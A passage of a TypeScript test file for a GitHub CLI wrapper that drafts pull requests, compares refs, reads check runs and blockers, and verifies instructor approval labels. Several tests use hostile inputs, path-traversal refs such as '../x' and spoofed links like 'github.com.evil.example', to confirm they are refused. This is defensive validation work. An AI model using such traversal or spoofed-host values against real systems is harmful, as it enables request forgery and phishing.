    yield* warned.ok(warned.github.markPrDraft(9));

    const failed = setup(fail(1, stderr));
    yield* failed.ok(failed.github.markPrDraft(9));
    assert.deepStrictEqual(failed.calls(), [undoCall]);
  }),
);

it.effect("markPrDraft on a PR that is closed or merged is done whatever gh says", () =>
  Effect.gen(function* () {
    // The words of the refusal are not relied on: the pull request's state decides.
    for (const state of ["CLOSED", "MERGED"]) {
      for (const stderr of [
        "! Pull request rawphp/softfac#9 is closed. Only open pull requests can be converted to draft\n",
        "GraphQL: Something unforeseen\n",
      ]) {
        const t = setup(fail(1, stderr), reply(prView(state, false)));
        yield* t.ok(t.github.markPrDraft(9));
        assert.deepStrictEqual(t.calls(), [undoCall, prViewCall("9")], `${state}: ${stderr}`);
      }
    }
  }),
);

it.effect("markPrDraft reads the state after any failure, not only a non-zero exit", () =>
  Effect.gen(function* () {
    // A timed out, rate limited or oversized undo on a PR that is closed by now is done too.
    for (const first of [
      timedOut(),
      fail(1, "gh: API rate limit exceeded (HTTP 403)"),
      truncated(),
    ]) {
      const t = setup(first, reply(prView("CLOSED", false)));
      yield* t.ok(t.github.markPrDraft(9));
      assert.deepStrictEqual(t.calls(), [undoCall, prViewCall("9")]);
    }
    // On one that is still open the original error comes back, whatever kind it was.
    const open = setup(timedOut(), reply(prView("OPEN", false)));
    const error = yield* open.err(open.github.markPrDraft(9));
    assert.strictEqual(error._tag, "GitHubTimedOut");
  }),
);

it.effect("markPrDraft that fails on an open PR or cannot read it is the original error", () =>
  Effect.gen(function* () {
    // Open: the failure is real.
    const open = setup(
      fail(1, "GraphQL: Resource not accessible by integration\n"),
      reply(prView("OPEN", false)),
    );
    const onOpen = yield* open.err(open.github.markPrDraft(9));
    assert.strictEqual(onOpen._tag, "GitHubFailed");
    if (onOpen._tag === "GitHubFailed") assert.include(onOpen.stderr, "not accessible");

    // The read fails too: still the original error.
    const unread = setup(
      fail(1, "GraphQL: Resource not accessible by integration\n"),
      fail(1, "HTTP 502: Bad Gateway"),
    );
    const onUnread = yield* unread.err(unread.github.markPrDraft(9));
    assert.strictEqual(onUnread._tag, "GitHubFailed");
    if (onUnread._tag === "GitHubFailed") assert.include(onUnread.stderr, "not accessible");

    // One that is gone: nothing to draft either.
    const gone = setup(
      fail(1, "boom"),
      fail(1, "GraphQL: Could not resolve to a PullRequest with the number of 9."),
    );
    const onGone = yield* gone.err(gone.github.markPrDraft(9));
    assert.strictEqual(onGone._tag, "GitHubFailed");
    if (onGone._tag === "GitHubFailed") assert.include(onGone.stderr, "boom");
  }),
);

it.effect("commentOnPr appends the marker", () =>
  Effect.gen(function* () {
    const t = setup(reply(""));
    yield* t.ok(t.github.commentOnPr(9, "gate passed"));
    assert.deepStrictEqual(t.calls(), [
      ["pr", "comment", "9", "--repo", REPO, "--body", "gate passed\n\n<!-- softfac -->"],
    ]);

    const failed = setup(spawnError());
    const error = yield* failed.err(failed.github.commentOnPr(9, "x"));
    assert.strictEqual(error._tag, "GitHubSpawnError");
  }),
);

const compareCall = (range: string) => [
  "api",
  `repos/rawphp/softfac/compare/${range}?per_page=1`,
  "--jq",
  ".status",
];

it.effect("compare asks for the status of the two refs with the exact call", () =>
  Effect.gen(function* () {
    const t = setup(reply("ahead\n"));
    assert.strictEqual(yield* t.ok(t.github.compare("main", BASE_SHA)), "ahead");
    assert.deepStrictEqual(t.calls(), [compareCall(`main...${BASE_SHA}`)]);
  }),
);

it.effect("compare reads each status GitHub gives", () =>
  Effect.gen(function* () {
    for (const [text, relation] of [
      ["ahead", "ahead"],
      ["behind\n", "behind"],
      ["identical\n", "identical"],
      ["diverged", "diverged"],
    ] as const) {
      const t = setup(reply(text));
      assert.strictEqual(yield* t.ok(t.github.compare("main", BASE_SHA)), relation, text);
    }
  }),
);

it.effect("compare of a commit GitHub does not know is null", () =>
  Effect.gen(function* () {
    const t = setup(fail(1, "gh: No commit found for SHA: 9f8e7d6 (HTTP 404)"));
    assert.isNull(yield* t.ok(t.github.compare("main", BASE_SHA)));
  }),
);

it.effect("compare keeps every other failure an error", () =>
  Effect.gen(function* () {
    for (const answer of [
      fail(1, "gh: API rate limit exceeded (HTTP 403)"),
      fail(1, "gh: Server Error (HTTP 500)"),
      fail(4, "gh: To get started with GitHub CLI, please run: gh auth login"),
      spawnError(),
    ]) {
      const t = setup(answer);
      yield* t.err(t.github.compare("main", BASE_SHA));
    }
  }),
);

it.effect("compare refuses a status it does not know", () =>
  Effect.gen(function* () {
    for (const answer of ["", "sideways", '"ahead"', "null", "{}"]) {
      const t = setup(reply(answer));
      const error = yield* t.err(t.github.compare("main", BASE_SHA));
      assert.strictEqual(error._tag, "GitHubParse", answer);
    }
  }),
);

it.effect("compare encodes a branch and refuses a ref that could leave the compare path", () =>
  Effect.gen(function* () {
    const t = setup(reply("behind"));
    yield* t.ok(t.github.compare("release/1.0", BASE_SHA));
    assert.strictEqual(
      t.calls()[0]![1],
      `repos/rawphp/softfac/compare/release/1.0...${BASE_SHA}?per_page=1`,
    );
    for (const [base, head] of [
      ["", BASE_SHA],
      ["main", ""],
      ["..", BASE_SHA],
      ["a..b", BASE_SHA],
      ["main", "../x"],
      ["main", "a...b"],
      ["a/../b", BASE_SHA],
    ]) {
      const refused = setup(reply("ahead"));
      const error = yield* refused.err(refused.github.compare(base!, head!));
      assert.strictEqual(error._tag, "GitHubInvalidArgument", `${base} ${head}`);
      assert.deepStrictEqual(refused.calls(), [], `${base} ${head}`);
    }
  }),
);

const run = (name: string, status: string, conclusion: string | null) => ({
  id: 1,
  name,
  status,
  conclusion,
  html_url: `https://github.com/rawphp/softfac/actions/runs/1/job/${name}`,
  app: { slug: "github-actions" },
});
const page = (runs: ReadonlyArray<unknown>) => JSON.stringify(runs);
const checksCall = [
  "api",
  `repos/rawphp/softfac/commits/${BASE_SHA}/check-runs?per_page=100&filter=latest`,
  "--paginate",
  "--jq",
  "[.check_runs[] | {name, status, conclusion, html_url}]",
];

it.effect("checks reads the check runs of the commit with the exact call", () =>
  Effect.gen(function* () {
    const t = setup(reply(page([run("gate", "completed", "success")])));
    const checks = yield* t.ok(t.github.checks(BASE_SHA, ["gate"]));
    assert.deepStrictEqual(t.calls(), [checksCall]);
    assert.deepStrictEqual(checks, [
      {
        name: "gate",
        state: "passed",
        conclusion: "success",
        url: "https://github.com/rawphp/softfac/actions/runs/1/job/gate",
      },
    ]);
  }),
);

it.effect("checks answers for each name asked in the order asked and ignores other runs", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        page([
          run("lint", "completed", "success"),
          run("other", "completed", "failure"),
          run("gate", "completed", "success"),
        ]),
      ),
    );
    const checks = yield* t.ok(t.github.checks(BASE_SHA, ["gate", "lint"]));
    assert.deepStrictEqual(
      checks.map((c) => [c.name, c.state]),
      [
        ["gate", "passed"],
        ["lint", "passed"],
      ],
    );
  }),
);

it.effect("a completed run passes on success and neutral and fails on anything else", () =>
  Effect.gen(function* () {
    for (const conclusion of ["success", "neutral"]) {
      const t = setup(reply(page([run("gate", "completed", conclusion)])));
      const got = yield* t.ok(t.github.checks(BASE_SHA, ["gate"]));
      assert.strictEqual(got[0]!.state, "passed", conclusion);
    }
    for (const conclusion of [
      "failure",
      "cancelled",
      "timed_out",
      "action_required",
      "stale",
      "startup_failure",
      "something_new",
    ]) {
      const t = setup(reply(page([run("gate", "completed", conclusion)])));
      const got = yield* t.ok(t.github.checks(BASE_SHA, ["gate"]));
      assert.strictEqual(got[0]!.state, "failed", conclusion);
      assert.strictEqual(got[0]!.conclusion, conclusion);
    }
    // Completed with no conclusion is not a pass.
    const t = setup(reply(page([run("gate", "completed", null)])));
    const got = yield* t.ok(t.github.checks(BASE_SHA, ["gate"]));
    assert.strictEqual(got[0]!.state, "failed");
    assert.strictEqual(got[0]!.conclusion, "completed");
  }),
);

it.effect("a run that has not completed is pending", () =>
  Effect.gen(function* () {
    for (const status of ["queued", "in_progress", "waiting", "pending", "requested"]) {
      const t = setup(reply(page([run("gate", status, null)])));
      const got = yield* t.ok(t.github.checks(BASE_SHA, ["gate"]));
      assert.strictEqual(got[0]!.state, "pending", status);
      assert.strictEqual(got[0]!.conclusion, status);
    }
  }),
);

it.effect("a check with no run is missing and not pending", () =>
  Effect.gen(function* () {
    const t = setup(reply("[]"));
    const got = yield* t.ok(t.github.checks(BASE_SHA, ["gate"]));
    assert.deepStrictEqual(got, [{ name: "gate", state: "missing", conclusion: "", url: null }]);
  }),
);

it.effect("a name that is not exactly the run's is missing", () =>
  Effect.gen(function* () {
    const t = setup(reply(page([run("Gate", "completed", "success")])));
    const got = yield* t.ok(t.github.checks(BASE_SHA, ["gate"]));
    assert.strictEqual(got[0]!.state, "missing");
  }),
);

it.effect("a skipped run is not a result so the check stays missing", () =>
  Effect.gen(function* () {
    // The factory's pull request is a draft until the checks pass, and a job guarded by
    // "not a draft" is skipped on it: nothing ran, so nothing passed.
    const t = setup(reply(page([run("gate", "completed", "skipped")])));
    const got = yield* t.ok(t.github.checks(BASE_SHA, ["gate"]));
    assert.strictEqual(got[0]!.state, "missing");
    assert.strictEqual(got[0]!.conclusion, "skipped");
  }),
);

it.effect("several runs of one name fail before they pend and pend before they pass", () =>
  Effect.gen(function* () {
    type Run = readonly [string, string | null];
    const state = (a: Run, b: Run) =>
      Effect.gen(function* () {
        const t = setup(reply(page([run("gate", a[0], a[1]), run("gate", b[0], b[1])])));
        return (yield* t.ok(t.github.checks(BASE_SHA, ["gate"])))[0]!.state;
      });
    assert.strictEqual(yield* state(["completed", "success"], ["completed", "failure"]), "failed");
    // The conclusion and the link are the deciding run's, whichever came first.
    const mixed = setup(
      reply(
        page([
          run("gate", "completed", "success"),
          { ...run("gate", "completed", "failure"), html_url: "https://github.com/x/y/runs/2" },
        ]),
      ),
    );
    assert.deepStrictEqual(yield* mixed.ok(mixed.github.checks(BASE_SHA, ["gate"])), [
      {
        name: "gate",
        state: "failed",
        conclusion: "failure",
        url: "https://github.com/x/y/runs/2",
      },
    ]);
    assert.strictEqual(yield* state(["in_progress", null], ["completed", "success"]), "pending");
    assert.strictEqual(yield* state(["completed", "success"], ["completed", "neutral"]), "passed");
    // A failure is not hidden by a run that is going again, in either order.
    assert.strictEqual(yield* state(["completed", "failure"], ["in_progress", null]), "failed");
    assert.strictEqual(yield* state(["in_progress", null], ["completed", "failure"]), "failed");
    // One skipped run among passing ones is not every run passing.
    assert.strictEqual(yield* state(["completed", "success"], ["completed", "skipped"]), "missing");
    assert.strictEqual(yield* state(["completed", "skipped"], ["completed", "success"]), "missing");
    // A skipped run does not hide one that is still going, or one that failed.
    assert.strictEqual(yield* state(["completed", "skipped"], ["in_progress", null]), "pending");
    assert.strictEqual(yield* state(["in_progress", null], ["completed", "skipped"]), "pending");
    assert.strictEqual(yield* state(["completed", "skipped"], ["completed", "failure"]), "failed");
    assert.strictEqual(yield* state(["completed", "failure"], ["completed", "skipped"]), "failed");
  }),
);

it.effect("of several runs that decide alike, the first one listed is reported", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        page([
          { ...run("gate", "completed", "failure"), html_url: "https://github.com/x/y/runs/1" },
          { ...run("gate", "completed", "cancelled"), html_url: "https://github.com/x/y/runs/2" },
        ]),
      ),
    );
    assert.deepStrictEqual(yield* t.ok(t.github.checks(BASE_SHA, ["gate"])), [
      {
        name: "gate",
        state: "failed",
        conclusion: "failure",
        url: "https://github.com/x/y/runs/1",
      },
    ]);
  }),
);

it.effect("checks reads every page", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        `${page([run("gate", "completed", "success")])}\n${page([run("lint", "in_progress", null)])}`,
      ),
    );
    const got = yield* t.ok(t.github.checks(BASE_SHA, ["gate", "lint"]));
    assert.strictEqual(got[0]!.state, "passed");
    assert.strictEqual(got[1]!.state, "pending");
  }),
);

it.effect("checks keeps a details link only when it is a GitHub one", () =>
  Effect.gen(function* () {
    for (const url of [
      "https://evil.example/x",
      "https://github.com.evil.example/x",
      "http://github.com/x",
    ]) {
      const odd = setup(reply(page([{ ...run("gate", "completed", "failure"), html_url: url }])));
      assert.isNull((yield* odd.ok(odd.github.checks(BASE_SHA, ["gate"])))[0]!.url, url);
    }
    const none = setup(reply(page([{ ...run("gate", "completed", "failure"), html_url: null }])));
    assert.isNull((yield* none.ok(none.github.checks(BASE_SHA, ["gate"])))[0]!.url);
  }),
);

it.effect("checks refuses a commit that is not a full id before any call", () =>
  Effect.gen(function* () {
    for (const sha of ["", "main", "9f8e7d6", "../x", BASE_SHA.replaceAll("9", "g")]) {
      const t = setup(reply("[]"));
      const error = yield* t.err(t.github.checks(sha, ["gate"]));
      assert.strictEqual(error._tag, "GitHubInvalidArgument", sha);
      assert.deepStrictEqual(t.calls(), [], sha);
    }
  }),
);

it.effect("checks refuses an answer that is not a list of runs", () =>
  Effect.gen(function* () {
    for (const answer of ["{}", "not json", '[{"name":"gate"}]']) {
      const t = setup(reply(answer));
      const error = yield* t.err(t.github.checks(BASE_SHA, ["gate"]));
      assert.strictEqual(error._tag, "GitHubParse", answer);
    }
  }),
);

it.effect("checks that gh cannot read is the gh failure", () =>
  Effect.gen(function* () {
    const t = setup(fail(1, "gh: Not Found (HTTP 404)"));
    const error = yield* t.err(t.github.checks(BASE_SHA, ["gate"]));
    assert.strictEqual(error._tag, "GitHubFailed");
  }),
);

const blockedByCall = (issue: string) => [
  "api",
  `repos/rawphp/softfac/issues/${issue}/dependencies/blocked_by`,
  "--paginate",
];
const blockerRow = (number: number, state: string, repo: string) =>
  `{"id":${number},"number":${number},"state":"${state}","title":"t","repository_url":"https://api.github.com/repos/${repo}","labels":[]}`;
const openBlocker = (number: number, repo: string): Blocker => ({ repo, number });

it.effect("an issue with no blockers has no open blockers", () =>
  Effect.gen(function* () {
    const t = setup(reply("[]"));
    assert.deepStrictEqual(yield* t.ok(t.github.openBlockers(14)), []);
    assert.deepStrictEqual(t.calls(), [blockedByCall("14")]);
  }),
);

it.effect("a closed blocker is resolved whatever closed it", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        `[${blockerRow(13, "closed", "rawphp/softfac")},${blockerRow(12, "closed", "rawphp/other")}]`,
      ),
    );
    assert.deepStrictEqual(yield* t.ok(t.github.openBlockers(14)), []);
  }),
);

it.effect(
  "only the exact REST state `closed` resolves a blocker; any other state still blocks",
  () =>
    Effect.gen(function* () {
      // The dependency listing's state is REST's lowercase `open` or `closed`. A state the
      // factory does not know, or one in another case, is not taken as resolved: the issue
      // waits rather than starting on a guess.
      const t = setup(
        reply(
          `[${blockerRow(13, "unknown", "rawphp/softfac")},${blockerRow(12, "CLOSED", "rawphp/softfac")},${blockerRow(11, "closed", "rawphp/softfac")}]`,
        ),
      );
      assert.deepStrictEqual(yield* t.ok(t.github.openBlockers(14)), [
        openBlocker(13, "rawphp/softfac"),
        openBlocker(12, "rawphp/softfac"),
      ]);
    }),
);

it.effect("open blockers keep the repo they are in", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        `[${blockerRow(13, "open", "rawphp/softfac")},${blockerRow(12, "closed", "rawphp/softfac")},${blockerRow(7, "open", "acme/widgets")}]`,
      ),
    );
    assert.deepStrictEqual(yield* t.ok(t.github.openBlockers(14)), [
      openBlocker(13, "rawphp/softfac"),
      openBlocker(7, "acme/widgets"),
    ]);
  }),
);

it.effect("blockers on every page are read", () =>
  Effect.gen(function* () {
    // `gh api --paginate` may print each page as its own array.
    const t = setup(
      reply(
        `[${blockerRow(1, "closed", "rawphp/softfac")}][${blockerRow(2, "open", "rawphp/softfac")}]`,
      ),
    );
    assert.deepStrictEqual(yield* t.ok(t.github.openBlockers(14)), [
      openBlocker(2, "rawphp/softfac"),
    ]);
  }),
);

it.effect("blockers that cannot be read are an error", () =>
  Effect.gen(function* () {
    const spawn = setup(spawnError());
    assert.strictEqual((yield* spawn.err(spawn.github.openBlockers(14)))._tag, "GitHubSpawnError");

    const failed = setup(fail(1, "Not Found"));
    assert.strictEqual((yield* failed.err(failed.github.openBlockers(14)))._tag, "GitHubFailed");

    for (const stdout of ["oops", "", '{"message":"x"}']) {
      const t = setup(reply(stdout));
      const error = yield* t.err(t.github.openBlockers(14));
      assert.strictEqual(error._tag, "GitHubParse", stdout);
    }
  }),
);

it.effect("an open blocker whose repo is unknown is an error, not a guess", () =>
  Effect.gen(function* () {
    for (const row of [
      '{"number":3,"state":"open"}',
      '{"number":3,"state":"open","repository_url":"x"}',
    ]) {
      const t = setup(reply(`[${row}]`));
      const error = yield* t.err(t.github.openBlockers(14));
      assert.strictEqual(error._tag, "GitHubParse", row);
    }
  }),
);

const bodyCall = (issue: string) => ["issue", "view", issue, "--repo", REPO, "--json", "body"];
const restCall = (repo: string, issue: string) => ["api", `repos/${repo}/issues/${issue}`];
const bodyReply = (body: string) => JSON.stringify({ body });

it.effect("text blockers of a body without the section read nothing more", () =>
  Effect.gen(function* () {
    const t = setup(reply(bodyReply("## Cause\nSee #5\n")));
    assert.deepStrictEqual(yield* t.ok(t.github.textBlockers(14)), []);
    assert.deepStrictEqual(t.calls(), [bodyCall("14")]);

    const empty = setup(reply('{"body":null}'));
    assert.deepStrictEqual(yield* empty.ok(empty.github.textBlockers(14)), []);
  }),
);

it.effect("text blockers are the named issues that are not closed", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(bodyReply("## Depends on\n#13, acme/widgets#7 and #5\n\n## Fix\n#99\n")),
      reply('{"number":13,"state":"open","title":"t"}'),
      reply('{"number":7,"state":"closed"}'),
      reply('{"number":5,"state":"open"}'),
    );
    assert.deepStrictEqual(yield* t.ok(t.github.textBlockers(14)), [
      openBlocker(13, REPO),
      openBlocker(5, REPO),
    ]);
    assert.deepStrictEqual(t.calls(), [
      bodyCall("14"),
      restCall(REPO, "13"),
      restCall("acme/widgets", "7"),
      restCall(REPO, "5"),
    ]);
  }),
);

it.effect("text blockers resolved once every named issue is closed", () =>
  Effect.gen(function* () {
    const t = setup(reply(bodyReply("## Depends on\n#13\n")), reply('{"state":"closed"}'));
    assert.deepStrictEqual(yield* t.ok(t.github.textBlockers(14)), []);
  }),
);

it.effect("only the exact REST state `closed` resolves a named issue; any other still blocks", () =>
  Effect.gen(function* () {
    // The same rule as the dependency listing: a state in another case is not taken as resolved.
    const t = setup(
      reply(bodyReply("## Depends on\n#13, #12, #11\n")),
      reply('{"state":"CLOSED"}'),
      reply('{"state":"unknown"}'),
      reply('{"state":"closed"}'),
    );
    assert.deepStrictEqual(yield* t.ok(t.github.textBlockers(14)), [
      openBlocker(13, REPO),
      openBlocker(12, REPO),
    ]);
  }),
);

it.effect("a Depends on section naming more than the cap is an error before any is read", () =>
  Effect.gen(function* () {
    const refs = (count: number) =>
      Array.from({ length: count }, (_, at) => `#${at + 1}`).join(" ");

    const over = setup(reply(bodyReply(`## Depends on\n${refs(MAX_DEPENDS_ON + 1)}\n`)));
    assert.strictEqual((yield* over.err(over.github.textBlockers(14)))._tag, "GitHubParse");
    assert.deepStrictEqual(over.calls(), [bodyCall("14")]);

    const atCap = setup(
      reply(bodyReply(`## Depends on\n${refs(MAX_DEPENDS_ON)}\n`)),
      ...Array.from({ length: MAX_DEPENDS_ON }, () => reply('{"state":"closed"}')),
    );
    assert.deepStrictEqual(yield* atCap.ok(atCap.github.textBlockers(14)), []);
    assert.strictEqual(atCap.calls().length, MAX_DEPENDS_ON + 1);
  }),
);

it.effect("a named issue that cannot be read is an error, not a resolved blocker", () =>
  Effect.gen(function* () {
    const body = bodyReply("## Depends on\n#13, #5\n");
    const missing = setup(
      reply(body),
      reply('{"state":"closed"}'),
      fail(1, "gh: Not Found (HTTP 404)"),
    );
    assert.strictEqual((yield* missing.err(missing.github.textBlockers(14)))._tag, "GitHubFailed");

    const oops = setup(reply(body), reply("oops"));
    assert.strictEqual((yield* oops.err(oops.github.textBlockers(14)))._tag, "GitHubParse");

    const empty = setup(reply(body), reply("{}"));
    assert.strictEqual((yield* empty.err(empty.github.textBlockers(14)))._tag, "GitHubParse");
  }),
);

it.effect("a body that cannot be read is an error", () =>
  Effect.gen(function* () {
    const failed = setup(fail(1, "boom"));
    assert.strictEqual((yield* failed.err(failed.github.textBlockers(14)))._tag, "GitHubFailed");
    const oops = setup(reply("oops"));
    assert.strictEqual((yield* oops.err(oops.github.textBlockers(14)))._tag, "GitHubParse");
  }),
);

/** When the instructor applied `factory:ready` in most of the approval tests. */
const LABELED = "2026-10-04T10:00:00Z";
/** After LABELED, and before LATER. */
const AFTER = "2026-10-04T10:30:00Z";
const LATER = "2026-10-04T11:00:00Z";
/** When the issue was written: the oldest entry of the edit history, by its author. */
const CREATED = "2026-10-04T08:00:00Z";

/** A person by login, or an App (`Bot`) that carries a login, or no one. */
type Who = string | { readonly bot: string } | null;
type Edit = readonly [at: string, who: Who];
type TimelineNode = Record<string, unknown>;

const pad = (n: number) => String(n).padStart(2, "0");

const approvalCall = () => [
  "api",
  "graphql",
  "-f",
  `query=${APPROVAL_QUERY}`,
  "-f",
  "owner=rawphp",
  "-f",
  "name=softfac",
  "-F",
  "number=6",
];

const actorOf = (who: Who) =>
  who === null
    ? null
    : typeof who === "string"
      ? { __typename: "User", login: who }
      : { __typename: "Bot", login: who.bot };
/** A GitHub App whose GraphQL login matches an instructor's. */
const botOf = (login: string): Who => ({ bot: login });

const labelEvent = (kind: string, at: string, actor: Who, label: string): TimelineNode => ({
  __typename: kind,
  createdAt: at,
  actor: actorOf(actor),
  label: { name: label },
});
/** A RenamedTitleEvent: only who and when are asked for, never the titles. */
const renameEvent = (at: string, actor: Who): TimelineNode => ({
  __typename: "RenamedTitleEvent",
  createdAt: at,
  actor: actorOf(actor),
});
const readyOn = (at: string, actor: Who) => labelEvent("LabeledEvent", at, actor, "factory:ready");
const readyOff = (at: string, actor: Who) =>
  labelEvent("UnlabeledEvent", at, actor, "factory:ready");

/** `userContentEdits` as GitHub answers `first: 100`: newest first, with the real total. */
const editsJson = (newestFirst: ReadonlyArray<Edit>, total: number) => ({
  totalCount: total,
  nodes: newestFirst.map(([editedAt, who]) => ({ editedAt, editor: actorOf(who) })),
});

/** A history written oldest first, as the tests think of it, in GitHub's order. */
const newestFirst = (oldestFirst: ReadonlyArray<Edit>): Array<Edit> => oldestFirst.toReversed();

/** The approval answer with exactly these history nodes (newest first) and this total. */
const approvalReplyRaw = (
  events: ReadonlyArray<TimelineNode>,
  totalEvents: number,
  last: Edit | null,
  editNodes: ReadonlyArray<Edit>,
  totalEdits: number,
) =>
  JSON.stringify({
    data: {
      repository: {
        issue: {
          timelineItems: { totalCount: totalEvents, nodes: events },
          lastEditedAt: last === null ? null : last[0],
          editor: last === null ? null : actorOf(last[1]),
          userContentEdits: editsJson(editNodes, totalEdits),
        },
      },
    },
  });

/** `events` are oldest first, as GitHub lists them. `edits` is the history oldest first. */
const approvalReply = (
  events: ReadonlyArray<TimelineNode>,
  totalEvents: number,
  last: Edit | null,
  edits: ReadonlyArray<Edit>,
) => approvalReplyRaw(events, totalEvents, last, newestFirst(edits), edits.length);

/** The events as the tests think of them, with the real total. */
const eventsReply = (
  events: ReadonlyArray<TimelineNode>,
  last: Edit | null,
  edits: ReadonlyArray<Edit>,
) => approvalReply(events, events.length, last, edits);

const creationOnly = (author: string): Array<Edit> => [[CREATED, author]];

const approvalOf = (answer: string, who: ReadonlyArray<string>) =>
  Effect.gen(function* () {
    const t = setup(reply(answer));
    const found = yield* t.ok(t.github.approval(6, who));
    assert.deepStrictEqual(t.calls(), [approvalCall()]);
    return found;
  });

const approved = (labeledAt: string, labeledBy: string): Approval => ({
  kind: "approved",
  labeledAt,
  labeledBy,
});
const refused = (refusal: Refusal): Approval => ({ kind: "refused", refusal });
const editedAfter = (labeledAt: string): Refusal => ({ kind: "edited-after-label", labeledAt });
const historyCut = (labeledAt: string): Refusal => ({
  kind: "edit-history-incomplete",
  labeledAt,
});
const byNonInstructor = (by: string | null, labeledAt: string): Refusal => ({
  kind: "labeled-by-non-instructor",
  by,
  labeledAt,
});
const NOT_FOUND: Refusal = { kind: "label-not-found" };
const LABEL_CUT: Refusal = { kind: "label-history-incomplete" };

it.effect("approval reads the real shapes and sends one call", () =>
  Effect.gen(function* () {
    const real =
      '{"data":{"repository":{"issue":{"timelineItems":{"totalCount":3,"nodes":[{"__typename":"UnlabeledEvent","createdAt":"2026-10-04T11:36:21Z","actor":{"__typename":"User","login":"rawphp"},"label":{"name":"factory:building"}},{"__typename":"LabeledEvent","createdAt":"2026-10-04T11:36:21Z","actor":{"__typename":"User","login":"rawphp"},"label":{"name":"factory:ready"}},{"__typename":"RenamedTitleEvent","createdAt":"2026-10-04T11:48:55Z","actor":{"__typename":"User","login":"rawphp"}}]},"lastEditedAt":null,"editor":null,"userContentEdits":{"totalCount":1,"nodes":[{"editedAt":"2026-10-04T09:50:06Z","editor":{"__typename":"User","login":"outside-user"}}]}}}}}';
    assert.deepStrictEqual(
      yield* approvalOf(real, ["rawphp"]),
      approved("2026-10-04T11:36:21Z", "rawphp"),
    );
  }),
);

it.effect("an outside author's unedited report labelled by an instructor is approved", () =>
  Effect.gen(function* () {
    // The creation entry is by the author, before the label, and is ignored.
    const answer = eventsReply([readyOn(LABELED, "tom")], null, creationOnly("outsider"));
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), approved(LABELED, "tom"));
  }),
);

it.effect("an issue with no history at all is approved when an instructor labelled it", () =>
  Effect.gen(function* () {
    const answer = eventsReply([readyOn(LABELED, "tom")], null, []);
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), approved(LABELED, "tom"));
  }),
);

it.effect("the instructor comparison ignores case", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [readyOn(LABELED, "TomK")],
      [AFTER, "TOMK"],
      [
        [CREATED, "outsider"],
        [AFTER, "TOMK"],
      ],
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tomk"]), approved(LABELED, "TomK"));
  }),
);

it.effect("other labels in the events are ignored", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [
        labelEvent("LabeledEvent", "2026-10-04T09:00:00Z", "eve", "bug"),
        readyOn(LABELED, "tom"),
        labelEvent("UnlabeledEvent", AFTER, "eve", "bug"),
        labelEvent("LabeledEvent", AFTER, "eve", "factory:readyish"),
      ],
      null,
      creationOnly("eve"),
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), approved(LABELED, "tom"));
  }),
);

it.effect(
  "a label applied, removed and applied again by an instructor counts the later event",
  () =>
    Effect.gen(function* () {
      // A non-instructor applied it first and an instructor reviewed and re-applied it.
      const answer = eventsReply(
        [
          readyOn("2026-10-04T09:00:00Z", "eve"),
          readyOff("2026-10-04T09:30:00Z", "tom"),
          readyOn(LABELED, "tom"),
        ],
        null,
        creationOnly("eve"),
      );
      assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), approved(LABELED, "tom"));
    }),
);

it.effect("a label applied by an instructor then reapplied by a non-instructor is refused", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [
        readyOn("2026-10-04T09:00:00Z", "tom"),
        readyOff("2026-10-04T09:30:00Z", "tom"),
        readyOn(LABELED, "eve"),
      ],
      null,
      creationOnly("eve"),
    );
    assert.deepStrictEqual(
      yield* approvalOf(answer, ["tom"]),
      refused(byNonInstructor("eve", LABELED)),
    );
  }),
);

it.effect("a label applied by a non-instructor is refused", () =>
  Effect.gen(function* () {
    const answer = eventsReply([readyOn(LABELED, "eve")], null, creationOnly("eve"));
    assert.deepStrictEqual(
      yield* approvalOf(answer, ["tom"]),
      refused(byNonInstructor("eve", LABELED)),
    );
  }),
);

it.effect("a label applied by a deleted account is refused", () =>
  Effect.gen(function* () {
    const answer = eventsReply([readyOn(LABELED, null)], null, creationOnly("tom"));
    assert.deepStrictEqual(
      yield* approvalOf(answer, ["tom"]),
      refused(byNonInstructor(null, LABELED)),
    );
  }),
);

it.effect("a label that was removed and not applied again is not found", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [readyOn("2026-10-04T09:00:00Z", "tom"), readyOff(LABELED, "tom")],
      null,
      creationOnly("tom"),
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), refused(NOT_FOUND));
  }),
);

it.effect("no label events at all is not found", () =>
  Effect.gen(function* () {
    const answer = eventsReply([], null, creationOnly("tom"));
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), refused(NOT_FOUND));
  }),
);

/** `n` events about another label, oldest first. */
const noise = (n: number): Array<TimelineNode> =>
  Array.from({ length: n }, (_, i) =>
    labelEvent(
      i % 2 === 0 ? "LabeledEvent" : "UnlabeledEvent",
      "2026-10-04T09:00:00Z",
      "tom",
      "bug",
    ),
  );

it.effect("a hundred events of a longer history without the label is incomplete", () =>
  Effect.gen(function* () {
    const answer = approvalReply(noise(100), 150, null, creationOnly("tom"));
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), refused(LABEL_CUT));
  }),
);

it.effect("a label found among the newest hundred is enough whatever the total", () =>
  Effect.gen(function* () {
    const events = [...noise(99), readyOn(LABELED, "tom")];
    const answer = approvalReply(events, 400, null, creationOnly("tom"));
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), approved(LABELED, "tom"));
  }),
);

it.effect("a removal among the newest hundred is not a missing history", () =>
  Effect.gen(function* () {
    // The label was taken off in view: the history is not why it is missing.
    const events = [readyOn("2026-10-04T08:30:00Z", "tom"), ...noise(98), readyOff(LABELED, "tom")];
    const answer = approvalReply(events, 100, null, creationOnly("tom"));
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), refused(NOT_FOUND));
  }),
);

it.effect("a complete hundred or a short page without the label is only not found", () =>
  Effect.gen(function* () {
    // Exactly 100 in all: nothing is hidden.
